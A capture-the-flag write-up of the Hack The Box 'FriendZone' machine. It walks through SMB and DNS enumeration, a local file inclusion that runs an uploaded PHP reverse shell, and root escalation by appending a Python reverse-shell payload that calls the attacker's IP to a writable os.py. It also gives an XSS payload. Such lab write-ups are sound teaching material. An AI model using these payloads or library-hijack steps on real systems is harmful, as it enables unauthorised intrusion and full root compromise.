## Default Information
IP Address: 10.10.10.123\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.123    friendzone.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.123 --rate=1000 -e tun0 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-03-12 00:29:24 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 53/tcp on 10.10.10.123                                    
Discovered open port 21/tcp on 10.10.10.123                                    
Discovered open port 80/tcp on 10.10.10.123                                    
Discovered open port 139/tcp on 10.10.10.123                                   
Discovered open port 445/tcp on 10.10.10.123                                   
Discovered open port 137/udp on 10.10.10.123                                   
Discovered open port 443/tcp on 10.10.10.123                                   
Discovered open port 22/tcp on 10.10.10.123                                    
Discovered open port 53/udp on 10.10.10.123 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 21  | ftp | vsftpd 3.0.3 | Open |
| 22  | ssh | OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | Open |
| 53  | domain | ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | Open |
| 80  | http | Apache httpd 2.4.29 ((Ubuntu)) | Open |
| 139 | netbios-ssn | Samba smbd 3.X - 4.X (workgroup: WORKGROUP) | Open |
| 443 | ssl/http | Apache httpd 2.4.29 | Open |
| 445 | netbios-ssn | Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) | Open |

### FTP Enumeration
Firstly, we will try to do an anonymous login on the FTP server on port 21. Unfortunately, we are unable to do an anaoymous login using anonymous:anonymous

```
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.10.123
Connected to 10.10.10.123.
220 (vsFTPd 3.0.3)
Name (10.10.10.123:kali): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
```

### SMB Enumeration on port 139/445
Next, we will enumerate the shares on the smb server using smbmap. From the output, we can see that we have access to the general and the Development share.

```
┌──(kali㉿kali)-[~]
└─$ smbmap -u null -p null -H 10.10.10.123
[+] Guest session       IP: 10.10.10.123:445    Name: friendzone.htb                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        Development                                             READ, WRITE     FriendZone Samba Server Files
        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
```

We will then enumerate the general share on the smb server using smbclient. From there, we are able to discover a creds.txt file that contains some admin credentials.
```
┌──(kali㉿kali)-[~]
└─$ smbclient -U "" //10.10.10.123/general
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 15:10:51 2019
  ..                                  D        0  Wed Jan 23 16:51:02 2019
  creds.txt                           N       57  Tue Oct  9 19:52:42 2018

9221460 blocks of size 1024. 6460372 blocks available
smb: \> get creds.txt
getting file \creds.txt of size 57 as creds.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

┌──(kali㉿kali)-[~/Desktop/friendzone]
└─$ cat creds.txt                                     
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

Afterwards, we will enumerate the Development share on the smb server using smbclient. However, we are unable to find any useful information.

```
┌──(kali㉿kali)-[~]
└─$ smbclient -U "" //10.10.10.123/Development
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Mar 11 19:47:05 2022
  ..                                  D        0  Wed Jan 23 16:51:02 2019

9221460 blocks of size 1024. 6460372 blocks available
smb: \> 
```
### Web Enumeration on port 80
We will first use gobuster to enumerate the endpoints on friendzone.htb.

```
http://10.10.10.123:80/index.html           (Status: 200) [Size: 324]
http://10.10.10.123:80/index.html           (Status: 200) [Size: 324]
http://10.10.10.123:80/server-status        (Status: 403) [Size: 300]
http://10.10.10.123:80/wordpress            (Status: 301) [Size: 316] [--> http://10.10.10.123/wordpress/]
```

Visiting http://friendzone.htb/wordpress, we are unable to find anything related to wordpress or wordpress plugins/themes. This is a deadend.
![Wordpress endpoint](https://github.com/joelczk/writeups/blob/main/HTB/Images/Friendzone/wordpress_http.png)

However, we are able to discover another endpoint friendzoneportal.red using whatweb.

```
[ Email ]
	Extract email addresses. Find valid email address and
	syntactically invalid email addresses from mailto: link
	tags. We match syntactically invalid links containing
	mailto: to catch anti-spam email addresses, eg. bob at
	gmail.com. This uses the simplified email regular
	expression from
	http://www.regular-expressions.info/email.html for valid
	email address matching.

	String       : info@friendzoneportal.red
```

We will then add friendzoneportal.red to our /etc/hosts file. We will also add friendzone.red to our /etc/hosts file.

```
10.10.10.123    friendzone.htb friendzone.red friendzoneportal.red
```

### Web Enumeration on friendzoneportal.red
Now, we will do a web enumeration on https://friendzoneportal.red using Gobuster. However, all the endpoints return a status code of 403, and there are no endpoints that could be exploited.

Next, we will try to enumerate for virtual hosts using gobuster as well. From the output, we were able to obtain a admin.friendzoneportal.red. We will then proceed to add this subdomain to our /etc/hosts file

```
10.10.10.123    friendzone.htb friendzone.red friendzoneportal.red admin.friendzoneportal.red
```

When we attempt to login to admin.friendzoneportal.red using the credentials that we have obtained earlier, we are greeted with the following page which tells us that this is not the admin page that we are looking for. We will therefore have to look for another admin page.

![admin.friendzoneportal.red login page](https://github.com/joelczk/writeups/blob/main/HTB/Images/Friendzone/admin_friendzoneportal.png)


Next, we will try to use the dig command to look for subdomain on friendzoneportal.red. From the output,  we are able to find a few more subdomains.

```
; <<>> DiG 9.17.19-3-Debian <<>> axfr friendzoneportal.red @10.10.10.123
;; global options: +cmd
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.   604800  IN      AAAA    ::1
friendzoneportal.red.   604800  IN      NS      localhost.
friendzoneportal.red.   604800  IN      A       127.0.0.1
admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
files.friendzoneportal.red. 604800 IN   A       127.0.0.1
imports.friendzoneportal.red. 604800 IN A       127.0.0.1
vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 256 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Sat Mar 12 01:37:13 EST 2022
;; XFR size: 9 records (messages 1, bytes 309)
```

We will then add files.friendzoneportal.red, imports.friendzoneportal.red and vpn.friendzoneportal.red to our /etc/hosts file

```
10.10.10.123    friendzone.htb friendzone.red friendzoneportal.red admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red
```

Unfortunately, all the 3 subdomains returned a 404 status code and could not be used for exploitation.

```
┌──(kali㉿kali)-[~]
└─$ curl -iLk https://files.friendzoneportal.red
HTTP/1.1 404 Not Found
Date: Sat, 12 Mar 2022 06:48:40 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 291
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL / was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at files.friendzoneportal.red Port 443</address>
</body></html>
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ curl -iLk https://imports.friendzoneportal.red
HTTP/1.1 404 Not Found
Date: Sat, 12 Mar 2022 06:48:51 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 293
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL / was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at imports.friendzoneportal.red Port 443</address>
</body></html>
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ curl -iLk https://vpn.friendzoneportal.red
HTTP/1.1 404 Not Found
Date: Sat, 12 Mar 2022 06:48:58 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 289
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL / was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at vpn.friendzoneportal.red Port 443</address>
</body></html>
```

### Web Enumeration on friendzone.red
Next, we will try to use gobuster to enumerate for endpoints on https://friendzone.red. From the output, we are able to find a few interesting endpoints such as https://friendzone.htb/js and https://friendzone.htb/admin

Visiting https://friendzone.htb/admin, we realize that this is a false positive as it redirects us to a 404 Not Found webpage.

```
┌──(kali㉿kali)-[~]
└─$ curl -iLk https://friendzone.htb/admin                                             
HTTP/1.1 404 Not Found
Date: Sat, 12 Mar 2022 06:37:26 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 284
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /admin was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at friendzone.htb Port 443</address>
</body></html>
```

Visiting https://friendzone.htb/js/js, we are redirected to a webpage that gives us a weird string which looks like a base64-encoded string.

![](https://github.com/joelczk/writeups/blob/main/HTB/Images/Friendzone/weird_string.png)

Decoding the weird string, we realize that this string is an invalid input and maybe a deadend. We will keep this string in mind in case we need it later.

```
┌──(kali㉿kali)-[~]
└─$ echo "SEFFd1pHVjMxWDE2NDcwNjY5OTkzMUk5TUFDQ21x" | base64 -d                                                  1 ⨯
HAEwZGV31X164706699931I9MACCmq                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ echo "HAEwZGV31X164706699931I9MACCmq" | base64 -d          
0dew�}z��:��}�R=0��base64: invalid input
```

Lastly, we will use gobuster to find potential virtual hosts on friendzone.red. From there, we are able to find another subdomain, uploads.friendzone.red

```
Found: uploads.friendzone.red (Status: 200) [Size: 391]
```

Now, we will add the subdomain to our /etc/hosts file

```
10.10.10.123    friendzone.htb friendzone.red uploads.friendzone.red friendzoneportal.red admin.friendzoneportal.red files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.red
```

Next, we will use the dig command to check if there are anymore subdomains. From the output, we are able to obtain 2 more subdomains, administrator1.friendzone.red and hr.friendzone.red.

```
┌──(kali㉿kali)-[~]
└─$ dig axfr friendzone.red @10.10.10.123

; <<>> DiG 9.17.19-3-Debian <<>> axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 260 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Sat Mar 12 01:46:03 EST 2022
;; XFR size: 8 records (messages 1, bytes 289)
```

Afterwards, visiting the sites we realize that https://hr.friendzone.htb returns a 404 but https://uploads.friendzone.htb will redirect us to an upload page that allows us to upload files.

We also realize that using the credentials that we have obtained earlier, we are able to authenticate to https://administrator1.friendzone.red and we will be redirected to the following page.

![administrator1.friendzone.red webpage](https://github.com/joelczk/writeups/blob/main/HTB/Images/Friendzone/administrator1.png)

## Exploit
### LFI in pagename parameter 
First, we will try to upload a reverse-shell.php file onto https://uploads.friendzone.red and afterwards, we will try to spawn the reverse shell by visiting https://administrator1.friendzone.red/dashboard.php?image_id=reverse-shell.php&pagename=1647093317. Unfortunately, we are unable to spawn a reverse shell using this method. 

![Failed reverse shell via file upload](https://github.com/joelczk/writeups/blob/main/HTB/Images/Friendzone/failed_reverse_shell.png)

However, we recall that the Development share has both read and write permissions. Let us try to upload a reverse shell to the Development share.

```
┌──(kali㉿kali)-[~/Desktop/friendzone]
└─$ smbclient -U "" //10.10.10.123/Development
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> put reverse-shell.php
putting file reverse-shell.php as \reverse-shell.php (2.5 kb/s) (average 2.5 kb/s)
```

Next, we will then spawn the reverse shell by visiting https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=/etc/Development/reverse-shell by exploiting the LFI vulnerability in the pagename parameter. However, this exploit only works if we remove the .php from the pagename parameter.

![Obtaining reverse shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Friendzone/reverseshell.png)

### Obtaining user flag
Before we obtain the user flag, let us first stabilize the reverse shell.

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@FriendZone:/$ export TERM=xterm
export TERM=xterm
www-data@FriendZone:/$ stty cols 132 rows 34
stty cols 132 rows 34
```

Finally, we will then be able to obtain the user flag.

```
www-data@FriendZone:/home/friend$ cat user.txt
cat user.txt
<Redacted user flag>
```
### Privilege Escalation to root
We are able to find mysql credentials in the file /var/www/mysql_data.conf. However, we realize that this server does not have mysql installed.

```
www-data@FriendZone:/var/www$ cat mysql_data.conf
cat mysql_data.conf
for development process this is the mysql creds for user friend
db_user=friend
db_pass=Agpyu12!0.213$
db_name=FZ
```

However, we recall that we have a open SSH port on port 22. Let us try to authenticate to the SSH service using the credentials that we have obtained earlier.

```
┌──(kali㉿kali)-[~]
└─$ ssh friend@10.10.10.123     
friend@10.10.10.123's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

You have mail.
Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3
friend@FriendZone:~$ 
```

Using Linpeas, we realize that the os.py file in /usr/lib/python2.7/os.py is writable. This means that we can potentially modify the file to create a reverse shell.

```
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                         
/usr/lib/python2.7
/usr/lib/python2.7/os.py
/usr/lib/python2.7/os.pyc
```

We are also able to find a file /opt/server_admin/reporter.py that imports the os module from /usr/lib/python2.7. Since the os module is imported and /usr/lib/python2.7/os.py is writable, we can modify the /usr/lib/python2.7/os.py to introduce a reverse shell.

```python
friend@FriendZone:/opt/server_admin$ cat reporter.py
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

However, we need to first find out if /opt/server_admin/reporter.py is being executed as a background process. We will use pspy64s to observer the background processes that is taking place. Fortunately, /opt/server_admin/reporter.py is being executed in the background. We also realize that this process is being execcuted with a UID of 0, which means that this process is being executed by root. 

```
2022/03/13 04:13:12 CMD: UID=0    PID=1      | /sbin/init splash 
2022/03/13 04:14:01 CMD: UID=0    PID=44640  | /usr/sbin/CRON -f 
2022/03/13 04:14:01 CMD: UID=0    PID=44642  | /usr/bin/python /opt/server_admin/reporter.py 
2022/03/13 04:14:01 CMD: UID=0    PID=44641  | /bin/sh -c /opt/server_admin/reporter.py 
```

With that information, we will now modify our /usr/lib/python2.7/os.py file to create our reverse shell. We can do so by adding the following lines of code at the end of the file

```
import socket,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.16.3",5000));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn("/bin/bash");
```

Afterwards, the reverse shell will be spawned with root privileges.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 5000         
listening on [any] 5000 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.123] 41090
root@FriendZone:~# whoami
whoami
root
root@FriendZone:~# 
```

### Obtaining root flag
```
root@FriendZone:~# cat /root/root.txt
cat /root/root.txt
<Redacted root flag>
```

## Post-Exploitation
### XSS on dashboard.php
Looking at the source code for dashboard.php, we realize that the site is also vulnerable to XSS attack. If we supply the image_id parameter to become ```' onerror='alert(document.domain)'```. 

```
 $image = $_GET["image_id"];
 echo "<center><img src='images/$image'></center>";
```

This is because when we supply the image_id parameter to become the XSS payload, the html code becomes ```<center><img src='images/' onerror='alert(document.domain)'></center>```

![XSS vulnerability](https://github.com/joelczk/writeups/blob/main/HTB/Images/Friendzone/xss.png)

### LFI vulnerability
The LFI vulnerability in the pagename parameter arises due to this line in the dashboard.php source code that causes any user input to be processed by the server.

```
include($_GET["pagename"].".php");
```

From the code, we can also see that the reason why we do not need to put the .php file extension to the exploit path is due to the fact that the code will add in a .php file extension to every user input in the pagename parameter.

### Uploads.php

We can also find that uploads.friendzone.red is just a smokescreen for us to waste time trying to upload files on as the upload.php file does not actually upload any file to the backend server.

```
<?php
// not finished yet -- friendzone admin !
if(isset($_POST["image"])){
echo "Uploaded successfully !<br>";
echo time()+3600;
}else{
echo "WHAT ARE YOU TRYING TO DO HOOOOOOMAN !";
}
?>
```
From the code above, all it does is that it will echo the upload time if we successfully upload an image on the frontend. However, the image is actually not uploaded to our backend server.
